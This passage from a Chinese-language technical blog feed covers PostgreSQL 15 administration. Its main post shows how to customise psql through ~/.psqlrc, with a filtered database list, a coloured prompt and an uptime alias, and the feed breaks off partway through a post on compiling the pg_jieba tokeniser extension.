class="line">Mar 03 23:53:25 centos7.shawnyan.com systemd[1]: Started Collect PG connections service.</span><br><span class="line">Mar 03 23:53:45 centos7.shawnyan.com systemd[1]: Started Collect PG connections service.</span><br></pre></td></tr></table></figure></div>
<h2 id="End">End</h2>
<p>简要总结，本文结合了 CentOS 7 新特性 systemd 的定时器功能，PostgreSQL 基础知识如何查看当前 txid，以及 Python 开发的基础知识，并调用了 Python 开发的 PostgreSQL 适配器 psycopg，以简单实现一个小功能点。</p>
<p>每日进步一点点，积跬步以致千里。</p>
<img  alt="4907662e501fb5ef.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230303-1c4a7133-d83e-430b-be2f-39b42a74e7dd.jpg"
                      referrerpolicy="no-referrer"
                >
<hr>
<p><a class="link"   href="https://www.modb.pro/db/617169" >https://www.modb.pro/db/617169 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2242" >https://pgfans.cn/a/2242 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.psycopg.org/psycopg3/docs/news.html#psycopg-3-1-4" >https://www.psycopg.org/psycopg3/docs/news.html#psycopg-3-1-4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Include error classes defined in PostgreSQL 15.<br>
Add support for Python 3.11 (ticket #305).<br>
Build binary packages with libpq from PostgreSQL 15.0. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>systemd</tag>
        <tag>psycopg</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】有趣的 psqlrc 你真的学废了麽</title>
    <url>/2023/postgresql/pg-15-psqlrc/</url>
    <content><![CDATA[<h2 id="BG">BG</h2>
<p>工作中接到一个需求，客户在使用 postgres 时，只想看到当前的用户所拥有的数据库。<br>
在 mysql 中，当用户登陆时，默认只能看到自己有权限的 database，例如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mysql -usbtest</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 39022</span><br><span class="line">Server version: 10.6.12-MariaDB-log Source distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">(sbtest@localhost) [(none)] 11:19:07&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| sbtest             |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.001 sec)</span><br><span class="line"></span><br><span class="line">(sbtest@localhost) [(none)] 11:19:08&gt; show grants;</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| Grants for sbtest@localhost                                                |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">| GRANT USAGE ON *.* TO `sbtest`@`localhost`                                 |</span><br><span class="line">| GRANT SELECT, INSERT, UPDATE, DELETE ON `sbtest`.* TO `sbtest`@`localhost` |</span><br><span class="line">+----------------------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.000 sec)</span><br><span class="line"></span><br><span class="line">(sbtest@localhost) [(none)] 11:19:11&gt;</span><br></pre></td></tr></table></figure></div>
<p>但是在postgresql中，用户登陆后可以看到所有的database，例如</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(sbtest@[local]) [sbtest] 11:21:56&gt; \l</span><br><span class="line">                                  List of databases</span><br><span class="line">+-----------+----------+-----------+---------+-------+------------------------------+</span><br><span class="line">|   Name    |  Owner   | Encoding  | Collate | Ctype |      Access privileges       |</span><br><span class="line">+-----------+----------+-----------+---------+-------+------------------------------+</span><br><span class="line">| mydb      | pguser   | UTF8      | C       | C     | =Tc/pguser                  +|</span><br><span class="line">|           |          |           |         |       | pguser=C*T*c*/pguser         |</span><br><span class="line">| postgres  | postgres | SQL_ASCII | C       | C     | =Tc/postgres                +|</span><br><span class="line">|           |          |           |         |       | postgres=CTc/postgres       +|</span><br><span class="line">|           |          |           |         |       | postgres_connect=c/postgres  |</span><br><span class="line">| sbtest    | sbtest   | SQL_ASCII | C       | C     |                              | -- just want to see this one</span><br><span class="line">| template0 | postgres | SQL_ASCII | C       | C     | =c/postgres                 +|</span><br><span class="line">|           |          |           |         |       | postgres=CTc/postgres        |</span><br><span class="line">| template1 | postgres | SQL_ASCII | C       | C     | =c/postgres                 +|</span><br><span class="line">|           |          |           |         |       | postgres=CTc/postgres        |</span><br><span class="line">| yandb     | postgres | SQL_ASCII | C       | C     |                              |</span><br><span class="line">+-----------+----------+-----------+---------+-------+------------------------------+</span><br><span class="line">(6 rows)</span><br></pre></td></tr></table></figure></div>
<h2 id="psql-是？">psql 是？</h2>
<p>psql 是 PostgreSQL 中的一个命令行交互式客户端工具，它允许你交互地键入 SQL 命令，然后把它们发送给 PostgreSQL 服务器，再显示 SQL 或命令的结果。输入的内容允许来自一个文件，此外它还提供了一些元命令和多种类似 shell 的特性来实现书写脚本，以及对大量任务的自动化工作。具有方便快捷、没有图形化工具使用上的一些限制等特性。</p>
<h2 id="list-all-databases">list all databases</h2>
<p>更深一步地说，<code>\l</code> 这条元命令真的只是这么简单一条SQL么，有没有其他判断条件。<br>
答案都在源码里，<br>
<a class="link"   href="https://gitee.com/shawnyan/postgres/blob/master/src/bin/psql/describe.c#L916" >https://gitee.com/shawnyan/postgres/blob/master/src/bin/psql/describe.c#L916 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">printfPQExpBuffer(&amp;buf,</span><br><span class="line">				  <span class="string">&quot;SELECT d.datname as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line">				  <span class="string">&quot;       pg_catalog.pg_get_userbyid(d.datdba) as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line">				  <span class="string">&quot;       pg_catalog.pg_encoding_to_char(d.encoding) as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line">				  <span class="string">&quot;       d.datcollate as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line">				  <span class="string">&quot;       d.datctype as \&quot;%s\&quot;,\n&quot;</span>,</span><br><span class="line">				  gettext_noop(<span class="string">&quot;Name&quot;</span>),</span><br><span class="line">				  gettext_noop(<span class="string">&quot;Owner&quot;</span>),</span><br><span class="line">				  gettext_noop(<span class="string">&quot;Encoding&quot;</span>),</span><br><span class="line">				  gettext_noop(<span class="string">&quot;Collate&quot;</span>),</span><br><span class="line">				  gettext_noop(<span class="string">&quot;Ctype&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (pset.sversion &gt;= <span class="number">150000</span>)</span><br><span class="line">	appendPQExpBuffer(&amp;buf,</span><br><span class="line">					  <span class="string">&quot;       d.daticulocale as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line">					  <span class="string">&quot;       CASE d.datlocprovider WHEN &#x27;c&#x27; THEN &#x27;libc&#x27; WHEN &#x27;i&#x27; THEN &#x27;icu&#x27; END AS \&quot;%s\&quot;,\n&quot;</span>,</span><br><span class="line">					  gettext_noop(<span class="string">&quot;ICU Locale&quot;</span>),</span><br><span class="line">					  gettext_noop(<span class="string">&quot;Locale Provider&quot;</span>));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	appendPQExpBuffer(&amp;buf,</span><br><span class="line">					  <span class="string">&quot;       NULL as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line">					  <span class="string">&quot;       &#x27;libc&#x27; AS \&quot;%s\&quot;,\n&quot;</span>,</span><br><span class="line">					  gettext_noop(<span class="string">&quot;ICU Locale&quot;</span>),</span><br><span class="line">					  gettext_noop(<span class="string">&quot;Locale Provider&quot;</span>));</span><br><span class="line">appendPQExpBufferStr(&amp;buf, <span class="string">&quot;       &quot;</span>);</span><br><span class="line">printACLColumn(&amp;buf, <span class="string">&quot;d.datacl&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (verbose)</span><br><span class="line">	appendPQExpBuffer(&amp;buf,</span><br><span class="line">					  <span class="string">&quot;,\n       CASE WHEN pg_catalog.has_database_privilege(d.datname, &#x27;CONNECT&#x27;)\n&quot;</span></span><br><span class="line">					  <span class="string">&quot;            THEN pg_catalog.pg_size_pretty(pg_catalog.pg_database_size(d.datname))\n&quot;</span></span><br><span class="line">					  <span class="string">&quot;            ELSE &#x27;No Access&#x27;\n&quot;</span></span><br><span class="line">					  <span class="string">&quot;       END as \&quot;%s\&quot;&quot;</span></span><br><span class="line">					  <span class="string">&quot;,\n       t.spcname as \&quot;%s\&quot;&quot;</span></span><br><span class="line">					  <span class="string">&quot;,\n       pg_catalog.shobj_description(d.oid, &#x27;pg_database&#x27;) as \&quot;%s\&quot;&quot;</span>,</span><br><span class="line">					  gettext_noop(<span class="string">&quot;Size&quot;</span>),</span><br><span class="line">					  gettext_noop(<span class="string">&quot;Tablespace&quot;</span>),</span><br><span class="line">					  gettext_noop(<span class="string">&quot;Description&quot;</span>));</span><br><span class="line">appendPQExpBufferStr(&amp;buf,</span><br><span class="line">					 <span class="string">&quot;\nFROM pg_catalog.pg_database d\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (verbose)</span><br><span class="line">	appendPQExpBufferStr(&amp;buf,</span><br><span class="line">						 <span class="string">&quot;  JOIN pg_catalog.pg_tablespace t on d.dattablespace = t.oid\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pattern)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!validateSQLNamePattern(&amp;buf, pattern, <span class="literal">false</span>, <span class="literal">false</span>,</span><br><span class="line">								<span class="literal">NULL</span>, <span class="string">&quot;d.datname&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">								<span class="literal">NULL</span>, <span class="number">1</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		termPQExpBuffer(&amp;buf);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">appendPQExpBufferStr(&amp;buf, <span class="string">&quot;ORDER BY 1;&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>可以看到，对于 PG15 以上版本，增加了字段 <code>pg_catalog.pg_database.daticulocale</code></p>
<ul>
<li>code</li>
</ul>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;       d.daticulocale as \&quot;%s\&quot;,\n&quot;</span></span><br><span class="line"><span class="string">&quot;       CASE d.datlocprovider WHEN &#x27;c&#x27; THEN &#x27;libc&#x27; WHEN &#x27;i&#x27; THEN &#x27;icu&#x27; END AS \&quot;%s\&quot;,\n&quot;</span>,</span><br></pre></td></tr></table></figure></div>
<ul>
<li>table</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">postgres=# SELECT * FROM pg_database WHERE datname=&#x27;postgres&#x27;\x\g\x</span><br><span class="line">Expanded display is on.</span><br><span class="line">-[ RECORD 1 ]--+-----------</span><br><span class="line">oid            | 5</span><br><span class="line">datname        | postgres</span><br><span class="line">datdba         | 10</span><br><span class="line">encoding       | 6</span><br><span class="line">datlocprovider | c</span><br><span class="line">datistemplate  | f</span><br><span class="line">datallowconn   | t</span><br><span class="line">datconnlimit   | -1</span><br><span class="line">datfrozenxid   | 717</span><br><span class="line">datminmxid     | 1</span><br><span class="line">dattablespace  | 1663</span><br><span class="line">datcollate     | en_US.utf8</span><br><span class="line">datctype       | en_US.utf8</span><br><span class="line">daticulocale   |</span><br><span class="line">datcollversion | 2.31</span><br><span class="line">datacl         |</span><br></pre></td></tr></table></figure></div>
<p>这个字段的作用是，作为全局变量，存放 ICU locale ID。<br>
是 PG 15.0 新增特性。</p>
<p><a class="link"   href="https://www.postgresql.org/docs/release/15.0/" >https://www.postgresql.org/docs/release/15.0/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>Allow ICU collations to be set as the default for clusters and databases (Peter Eisentraut)</p>
<p>Previously, only libc-based collations could be selected at the cluster and database levels. ICU collations could only be used via explicit COLLATE clauses.</p>
</blockquote>
<p>关于这个feature的更多讨论，可以参阅文档<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
<h2 id="echo-hidden-是个好同志">echo_hidden 是个好同志</h2>
<p>在 PG 技术交流群中，有位老师指点迷津道，可以使用 ECHO_HIDDEN 来查看元命令的“内涵” SQL。<br>
于是，我便从元命令 <code>\l</code> 入手，先查看该元命令具体调用的是哪个sql，这里就用到了 echo_hidden, 使用它来研究 psql 的内部操作, 来显示的查看当前元命令所具体代表、执行了那条 SQL 语句, 示例如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(sbtest@[<span class="keyword">local</span>]) [sbtest] <span class="number">11</span>:<span class="number">21</span>:<span class="number">59</span><span class="operator">&gt;</span> \<span class="keyword">set</span> ECHO_HIDDEN <span class="keyword">on</span></span><br><span class="line">(sbtest@[<span class="keyword">local</span>]) [sbtest] <span class="number">11</span>:<span class="number">34</span>:<span class="number">19</span><span class="operator">&gt;</span> \l</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> QUERY <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"><span class="keyword">SELECT</span> d.datname <span class="keyword">as</span> &quot;Name&quot;,</span><br><span class="line">       pg_catalog.pg_get_userbyid(d.datdba) <span class="keyword">as</span> &quot;Owner&quot;,</span><br><span class="line">       pg_catalog.pg_encoding_to_char(d.encoding) <span class="keyword">as</span> &quot;Encoding&quot;,</span><br><span class="line">       d.datcollate <span class="keyword">as</span> &quot;Collate&quot;,</span><br><span class="line">       d.datctype <span class="keyword">as</span> &quot;Ctype&quot;,</span><br><span class="line">       pg_catalog.array_to_string(d.datacl, E<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">AS</span> &quot;Access privileges&quot;</span><br><span class="line"><span class="keyword">FROM</span> pg_catalog.pg_database d</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br></pre></td></tr></table></figure></div>
<p>将这条语句加个简单的过滤，将owner指向为当前用户，那么就可以只查看当前用户的database列表, 效果如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(sbtest@[<span class="keyword">local</span>]) [sbtest] <span class="number">11</span>:<span class="number">34</span>:<span class="number">23</span><span class="operator">&gt;</span> <span class="keyword">SELECT</span> d.datname <span class="keyword">as</span> &quot;Name&quot;,</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span>        pg_catalog.pg_get_userbyid(d.datdba) <span class="keyword">as</span> &quot;Owner&quot;,</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span>        pg_catalog.pg_encoding_to_char(d.encoding) <span class="keyword">as</span> &quot;Encoding&quot;,</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span>        d.datcollate <span class="keyword">as</span> &quot;Collate&quot;,</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span>        d.datctype <span class="keyword">as</span> &quot;Ctype&quot;,</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span>        pg_catalog.array_to_string(d.datacl, E<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">AS</span> &quot;Access privileges&quot;</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> pg_catalog.pg_database d</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">where</span> pg_catalog.pg_get_userbyid(d.datdba) <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">user</span>)</span><br><span class="line">sbtest<span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-----------+---------+-------+-------------------+</span></span><br><span class="line"><span class="operator">|</span>  Name  <span class="operator">|</span> Owner  <span class="operator">|</span> Encoding  <span class="operator">|</span> <span class="keyword">Collate</span> <span class="operator">|</span> Ctype <span class="operator">|</span> Access privileges <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-----------+---------+-------+-------------------+</span></span><br><span class="line"><span class="operator">|</span> sbtest <span class="operator">|</span> sbtest <span class="operator">|</span> SQL_ASCII <span class="operator">|</span> C       <span class="operator">|</span> C     <span class="operator">|</span>                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+-----------+---------+-------+-------------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<p>那么问题来了，每次都复制这么长一段sql很繁杂，有没有巧妙的方式来调用。</p>
<h2 id="psqlrc-登场">psqlrc 登场</h2>
<p>此时，psqlrc 登场，将上面这大段sql写到 <code>~/.psqlrc</code> 文件中。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi ~/.psqlrc</span><br><span class="line"></span><br><span class="line">\set l &#x27;SELECT d.datname as &quot;Name&quot;,pg_catalog.pg_get_userbyid(d.datdba) as &quot;Owner&quot;,pg_catalog.pg_encoding_to_char(d.encoding) as &quot;Encoding&quot;,d.datcollate as &quot;Collate&quot;,d.datctype as &quot;Ctype&quot;,pg_catalog.array_to_string(d.datacl, E\&#x27;\\n\&#x27;) AS &quot;Access privileges&quot; FROM pg_catalog.pg_database d where pg_catalog.pg_get_userbyid(d.datdba) in (select user) ORDER BY 1;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>再次登录 psql 并查看 database 列表，可以看到下面的结果：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ psql -Usbtest</span><br><span class="line"></span><br><span class="line">(sbtest@[local]) [sbtest] 11:39:41&gt; :l</span><br><span class="line">+--------+--------+-----------+---------+-------+-------------------+</span><br><span class="line">|  Name  | Owner  | Encoding  | Collate | Ctype | Access privileges |</span><br><span class="line">+--------+--------+-----------+---------+-------+-------------------+</span><br><span class="line">| sbtest | sbtest | SQL_ASCII | C       | C     |                   |</span><br><span class="line">+--------+--------+-----------+---------+-------+-------------------+</span><br><span class="line">(1 row)</span><br></pre></td></tr></table></figure></div>
<p>目标达成，显示结果很简单直接。</p>
<h2 id="psqlrc-其他实用玩法">psqlrc 其他实用玩法</h2>
<h3 id="彩色显示">彩色显示</h3>
<p>进入原生psql客户端后，略显单调，加点色彩可以使DBA工作添点乐趣，比如下图，</p>
<img  alt="p1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230301-1759088c-080a-4dee-835a-e439b480ce2d.png"
                      referrerpolicy="no-referrer"
                >
<p>通过 prompt 加入颜色元素，便可实现这种效果。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">\set PROMPT1 &#x27;%[%033[1;31m%]%[%033[32m%]psql:%[%033[36m%]//%n%[%033[34m%]@%[%033[36m%]%M:%&gt;%[%033[33m%]/%/%[%033[K%]%[%033[0m%]%# &#x27;</span><br></pre></td></tr></table></figure></div>
<h3 id="启动时间">启动时间</h3>
<p>在 linux 中，可以使用 <code>uptime</code> 命令查看系统运行时间，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ uptime</span><br><span class="line"> 11:52:12 up 706 days,  1:50,  3 users,  load average: 0.04, 0.04, 0.05</span><br></pre></td></tr></table></figure></div>
<p>在mysql中，可以使用元命令 <code>\s</code> 查看数据库运行时间，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(root@localhost) [(none)] 11:52:39&gt; \s</span><br><span class="line">--------------</span><br><span class="line">Uptime:                 15 days 20 hours 35 min 2 sec</span><br></pre></td></tr></table></figure></div>
<p>那么在 pg 中，则可以自定义一个 <code>:uptime</code> 方法。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">\<span class="keyword">set</span> uptime <span class="string">&#x27;select date_trunc(\&#x27;</span><span class="keyword">second</span>\<span class="string">&#x27;,current_timestamp - pg_postmaster_start_time()) as uptime;&#x27;</span></span><br><span class="line"></span><br><span class="line">(sbtest@[<span class="keyword">local</span>]) [sbtest] <span class="number">11</span>:<span class="number">50</span>:<span class="number">57</span><span class="operator">&gt;</span> :uptime</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span>     uptime      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5</span> days <span class="number">00</span>:<span class="number">52</span>:<span class="number">58</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------+</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="登陆提示语">登陆提示语</h3>
<p>结合上述知识点，增加了登陆提示语，每次登陆 psql 时，都可以看到欢迎提示。 Welcome~~~ 🥳</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[postgres<span class="variable">@centos7</span> <span class="operator">~</span>]$ psql</span><br><span class="line"></span><br><span class="line">Welcome <span class="keyword">to</span> PostgreSQL <span class="operator">!</span></span><br><span class="line">Your PostgreSQL connection id <span class="keyword">is</span> <span class="number">60735</span></span><br><span class="line">Server version: <span class="number">15.2</span><span class="operator">-</span>Yan</span><br><span class="line"><span class="comment">---------------</span></span><br><span class="line">Border style <span class="keyword">is</span> <span class="number">2.</span></span><br><span class="line">Timing <span class="keyword">is</span> on.</span><br><span class="line"><span class="keyword">Null</span> display <span class="keyword">is</span> &quot;[null]&quot;.</span><br><span class="line">psql (<span class="number">15.2</span><span class="operator">-</span>Yan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">21</span>:<span class="number">37</span>:<span class="number">13</span># </span><br></pre></td></tr></table></figure></div>
<img  alt="p2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230302-c41063b9-c3fc-43c4-b132-3cb8d2585b6f.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="参考">参考</h2>
<p>官档和源码永远是最好的参考资料。<br>
善于查阅原始资料才能摆脱 baidu/google/new bing/chatgpt DBA 的束缚，学习阅读源码，调试pg源码，才是走向【掌握】PostgreSQL 的唯一途径。</p>
<ul>
<li><a class="link"   href="https://www.postgresql.org/docs/15/app-psql.html" >https://www.postgresql.org/docs/15/app-psql.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a class="link"   href="https://github.com/postgres/postgres/blob/master/src/bin/psql/prompt.c" >https://github.com/postgres/postgres/blob/master/src/bin/psql/prompt.c <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
</ul>
<h2 id="总结">总结</h2>
<p>实际使用时，可按需设定，以便于常规工作需要，psqlrc 相当于增加了快捷键或者说是增加了自定义元命令，将大段的常用sql设定为简短的缩写，省去了查阅相关sql又少敲了N多字，可以成倍节约时间用在其他更有意义的事情上，也可以延长机械键盘使用寿命。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/617002" >https://www.modb.pro/db/617002 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2241" >https://pgfans.cn/a/2241 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<hr class="footnotes-sep">
<section class="footnotes">
<ol class="footnotes-list">
<li id="fn1" class="footnote-item"><p><a class="link"   href="https://www.postgresql.org/message-id/flat/5e756dd6-0e91-d778-96fd-b1bcb06c161a%402ndquadrant.com" >https://www.postgresql.org/message-id/flat/5e756dd6-0e91-d778-96fd-b1bcb06c161a%402ndquadrant.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>
</li>
</ol>
</section>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>psqlrc</tag>
        <tag>psql</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】PostgreSQL 中文分词插件 pg_jieba 编译安装</title>
    <url>/2023/postgresql/pg-15-ext-jieba/</url>
    <content><![CDATA[<h2 id="BG">BG</h2>
<p>昨日群里在讨论 PostgreSQL 的中文分词插件编译过程中异常中断的事情，我是第一次编译pg的插件，随笔记录下。</p>
<p>常见的中文分词插件有：zhparser、pg_jieba，可用于中文分词，全文检索。<br>
但从github仓库看，这两个插件的代码已经有段没更新，未必直接适配pg15，且为了便于学习pg知识，所以采用自编译的方式进行安装。</p>
<h2 id="测试环境">测试环境</h2>
<p>先交代环境，以免产生不必要的信息差，也为问题复现做好基础信息铺垫。</p>
<ol>
<li>
<p>OS 为 CentOS 7.9</p>
</li>
<li>
<p>需要安装 gcc 不然编译会报错。gcc 版本为 gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)</p>
</li>
</ol>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">checking for gcc... no</span><br><span class="line">checking for cc... no</span><br><span class="line">configure: error: in `/root/postgres&#x27;:</span><br><span class="line">configure: error: no acceptable C compiler found in $PATH</span><br><span class="line">See `config.log&#x27; for more details</span><br></pre></td></tr></table></figure></div>
<blockquote>
<p>其实这里也可以看到，gcc的版本是2015年Release的，很老旧了，如有条件建议升级 Kernel/OS version.</p>
</blockquote>
<ol start="3">
<li>cmake需要安装，版本且看下文。</li>
</ol>
<h2 id="编译安装-PG-15">编译安装 PG 15</h2>
<p>pg 版本为 v15.2, 直接下载源码包手动编译，需要安装其他依赖，此处暂不赘述，编译结果如下。</p>
<ol>
<li>对源码进行配置</li>
</ol>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/opt/pgsql-152 --datadir=/data/pgdata-152 --with-extra-version=&quot;-Yan&quot;</span><br><span class="line">...</span><br><span class="line">checking whether gcc -std=gnu99 supports -Wl,--as-needed... yes</span><br><span class="line">configure: using compiler=gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)</span><br><span class="line">configure: using CFLAGS=-Wall -Wmissing-prototypes -Wpointer-arith -Wdeclaration-after-statement -Werror=vla -Wendif-labels -Wmissing-format-attribute -Wformat-security -fno-strict-aliasing -fwrapv -fexcess-precision=standard -O2</span><br><span class="line">configure: using CPPFLAGS= -D_GNU_SOURCE </span><br><span class="line">configure: using LDFLAGS=  -Wl,--as-needed</span><br><span class="line">configure: creating ./config.status</span><br><span class="line">config.status: creating GNUmakefile</span><br><span class="line">config.status: creating src/Makefile.global</span><br><span class="line">config.status: creating src/include/pg_config.h</span><br><span class="line">config.status: creating src/include/pg_config_ext.h</span><br><span class="line">config.status: creating src/interfaces/ecpg/include/ecpg_config.h</span><br><span class="line">config.status: linking src/backend/port/tas/dummy.s to src/backend/port/tas.s</span><br><span class="line">config.status: linking src/backend/port/posix_sema.c to src/backend/port/pg_sema.c</span><br><span class="line">config.status: linking src/backend/port/sysv_shmem.c to src/backend/port/pg_shmem.c</span><br><span class="line">config.status: linking src/include/port/linux.h to src/include/pg_config_os.h</span><br><span class="line">config.status: linking src/makefiles/Makefile.linux to src/Makefile.port</span><br></pre></td></tr></table></figure></div>
<ol start="2">
